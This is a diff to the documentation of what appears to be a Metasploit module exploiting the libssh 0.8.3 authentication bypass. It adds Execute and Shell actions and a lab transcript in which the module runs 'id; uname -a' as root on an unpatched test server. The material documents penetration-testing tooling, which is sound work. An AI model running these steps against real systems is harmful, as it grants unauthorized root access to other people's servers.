@@ -20,13 +20,21 @@ additional code paths to be followed.
 4. Follow the steps in `INSTALL` to build libssh
 5. Run `build/examples/ssh_server_fork` (I like to `strace` it)
 
+## Actions
+
+```
+Name     Description
+----     -----------
+Execute  Execute a command
+Shell    Spawn a shell
+```
+
 ## Options
 
 **CMD**
 
-Set this to a command you want to execute in lieu of a standard shell
-session. An `exec` channel request will be sent instead of a `shell`
-request.
+Set this to a command or shell you want to execute. An `exec` channel
+request will be sent instead of a `shell` channel request.
 
 **SPAWN_PTY**
 
@@ -74,6 +82,25 @@ Linux ubuntu-xenial 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 20
 tty
 /dev/pts/1
 #
+```
+
+Positive testing of shell commands using the `Execute` action:
+
+```
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set action Execute
+action => Execute
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set cmd id; uname -a
+cmd => id; uname -a
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run
+
+[*] 172.28.128.3:2222 - Attempting authentication bypass
+[+] 172.28.128.3:2222 - SSH-2.0-libssh_0.8.3 appears to be unpatched
+[*] 172.28.128.3:2222 - Executed: id; uname -a
+uid=0(root) gid=0(root) groups=0(root)
+Linux ubuntu-xenial 4.4.0-134-generic #160-Ubuntu SMP Wed Aug 15 14:58:00 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ssh/libssh_auth_bypass) >
 ```
 
 Negative testing against patched libssh 0.8.4:
